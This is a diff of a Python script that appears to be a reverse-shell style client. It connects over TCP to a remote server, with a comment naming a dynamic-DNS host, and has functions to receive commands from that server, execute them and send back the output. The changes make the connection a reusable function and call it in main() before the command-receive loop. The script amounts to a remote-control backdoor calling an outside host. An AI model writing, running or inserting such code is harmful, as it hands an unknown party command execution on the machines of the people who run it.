@@ -14,17 +14,20 @@ import time
 
 
 #Server properties
-IP = '212.238.239.196' #    --> thanathos.hopto.org
+IP = '' #    --> thanathos.hopto.org
 PORT = 9999
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP socket
 
 #Try to establish a connection to the server
-try:
-    socket.connect((IP, PORT))
+def connect():
+    try:
+        socket.connect((IP, PORT))
 
-except Exception as e:
-    print(e)
+    except Exception as e:
+        print(e)
+        time.sleep(1)
 
+    return socket
 
 #   --> Function to receive a command, execute it and return the output
 def execute(command):
@@ -79,6 +82,9 @@ def send(message):
 
 def main():
 
+    x = connect()
+    print(x)
+    time.sleep(5)
     recv() #No need for send function, being called in receive
 
 main()
